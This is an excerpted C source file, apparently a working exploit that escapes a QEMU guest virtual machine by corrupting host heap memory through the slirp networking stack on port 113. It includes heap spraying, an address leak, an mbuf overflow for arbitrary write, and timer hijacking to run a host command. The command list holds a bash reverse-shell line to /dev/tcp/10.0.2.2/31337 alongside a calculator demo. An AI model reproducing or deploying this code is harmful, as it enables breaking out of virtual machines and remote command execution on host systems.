...
const char * GUEST_ADDR = "10.0.2.15";
const char * HOST_ADDR = "10.0.2.2";
const char * INTERFACE = "ens2"
...
int main() {
	...
	puts("game start");
	memcpy(buf, eth_frame, ETH_HDRLEN);  /* copy eth header into buf */
	iphdr = (struct ip *)(buf + ETH_HDRLEN); /* cast buf to struct ip and start filling */
	strcpy(src_ip, GUEST_ADDR);
	strcpy(dst_ip, HOST_ADDR);

	/* Create fake ICMP_ECHO request */
	iphdr->ip_hl = IP4_HDRLEN / sizeof(uint32_t); /* header len */
	iphdr->ip_v = 4;                              /* version */
	iphdr->ip_tos = 0;                            /* type of service */
	iphdr->ip_len = (ICMP_HDRLEN);                /* total length */
	iphdr->ip_id = (0xcdcd);                      /* identification */
	// Zero (1 bit)
	// Do not fragment flag (1 bit)
	// More fragments following flag (1 bit)
	// Fragmentation offset (13 bits)
	iphdr->ip_off = ((0 << 15) + (0 << 14) + (0 << 13) + (0 >> 3)); /* fragment offset field */
	iphdr->ip_ttl = 255;                          /* time to live */
	iphdr->ip_p = IPPROTO_ICMP;                   /* protocol */
	/* src and dst ip */
	...
	icmphdr = (struct icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN); /* create an icmp header */
	...
	/* create cmd array for user choice */
	/* TODO: fix reverse shell IP */
	const char * cmd_arr[] = {"/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.2/31337 0>&1'", "DISPLAY=:1 /usr/bin/gnome-calculator"};
	const char * exec_cmd = cmd_arr[1]; /* TODO: get rid of hardcoded cmd */
	memcpy(buf + ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN, exec_cmd, strlen(exec_cmd) + 1); /* concatenate exec_cmd to buf */

	g_spray_ip_id = 0xaabb; /* TODO: what is this? */

	/* send the exec command + ICMP echo request to HOST through send_ip_pkt */
	arbitrary_write(0x0b00, 3, buf, ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN + strlen(exec_cmd) + 1, 0x250);

	g_spray_ip_id = 0xbbaa;
	leak(0x0b00 + 0x318 + 0x14 + ETH_HDRLEN, 3); // After reass processing, m_data will be reduced by the length of the ip header
	...
	*(uint64_t *)(buf + 0x88) = heap_base + 0xe38 + 0xa; // address of cmd
	*(uint64_t *)(buf + 0x90) = 0;
	*(uint64_t *)(buf + 0x98) = 0x000f424000000000;
	...
	// qemu timer
	// Change the global main_loop_tlg
...
void leak(uint64_t addr, int addr_len) {
	...
	for (i = 0; i < 0x20; ++i) {
			...
			spray(0x2000, g_spray_ip_id + i); // send random bullshit of size 0x2000 + some headers
	}
	dbg_printf("spray finished.\n");

	s = socket(AF_INET, SOCK_STREAM, 0);
	ip_addr.sin_family = AF_INET;
	ip_addr.sin_addr.s_addr = inet_addr(HOST_ADDR);
	ip_addr.sin_port = htons(113); // vulnerable port
	len = sizeof(struct sockaddr_in);
	ret = connect(s, (struct sockaddr *)&ip_addr, len); // connect to host port 113
	if (ret == -1) {
			perror("0ops: client");
			exit(1);
	}
...
int arbitrary_write(uint64_t addr, int addr_len, uint8_t *write_data,
	...
	uint8_t *payload = malloc(IP_MAXPACKET);
	uint8_t *payload_start = payload;
	uint32_t *payload32 = (uint32_t *)payload;
	uint64_t *payload64 = (uint64_t *)payload;
	...
	vuln_sock = socket(AF_INET, SOCK_STREAM, 0);
	ip_addr.sin_family = AF_INET;
	ip_addr.sin_addr.s_addr = inet_addr(HOST_ADDR);
	ip_addr.sin_port = htons(113); // vulnerable port
	len = sizeof(struct sockaddr_in);
	ret = connect(vuln_sock, (struct sockaddr *)&ip_addr, len); // connect to HOST_ADDR on 113
	if (ret == -1) {
			perror("Could not connect to host port 113");
			exit(1);
	}
	pkt_info.ip_id = 0xdead;
	pkt_info.ip_off = 0;
	pkt_info.MF = 1;
	pkt_info.ip_p = 0xff;
	// TODO: merge this function with spray (it's almost the same!)
	// WHAT DOES THIS DO??
	send_ip_pkt(&pkt_info, payload, 0x300 + 4); // This packet is just behind so_rcv
	...
	*/
	for (i = 0; i < 6; ++i) {
			write(vuln_sock, payload, 0x500); // Cannot send a full m_buf, because there will be an off by null
			usleep(20000); // I don't know why, it seems that the kernel will merge packets?
										 // if it is merged, it will be off by null...
										 // so sleep
			dbg_printf("send %d complete\n", i + 1);
	}
	write(vuln_sock, payload, 1072); // TODO: why write 1072 more??
	// write 8752 bytes in total, TODO: Why?
	// actual overflow here
	// this starts overflowing the mbuf struct
	*payload64++ = 0;
	*payload64++ = 0x675; // chunk header
	*payload64++ = 0;     // m_next
	*payload64++ = 0;     // m_prev
	...
	*payload64++ = 0;     // m_prevpkt
	payload32 = (uint32_t *)payload64;
	*payload32++ = 0;     // m_flags
	*payload32++ = 0x608; // m_size (0x608 = 1544)
	payload64 = (uint64_t *)payload32;
	*payload64++ = 0;     // m_so (socket)
	payload = (uint8_t *)payload64;
	assert(addr_len <= 8);
	/* take each byte from target address and put it in payload */
	for (i = 0; i < addr_len; ++i) {
			*payload++ = (addr >> (i * 8)) & 0xff; // m_data (Current location of data)
	}
	/* send payload to vuln_sock (port 113 on HOST) */
	write(vuln_sock, payload_start, (uint8_t *)payload - payload_start);
	...
	pkt_info.MF = 0;
	pkt_info.ip_p = 0xff;
	send_ip_pkt(&pkt_info, write_data, write_data_len); // send write_data to HOST
...
// The real malloc size is payloadlen + 64
// send packet with appended payload to HOST
void send_ip_pkt(struct ip_pkt_info *pkt_info, uint8_t *payload, int payloadlen) {
	...
	// Send packet.
	if (sendto(sd, packet, IP4_HDRLEN + payloadlen, 0,
...
/* send TCP packet of size to HOST (port 60->80) */
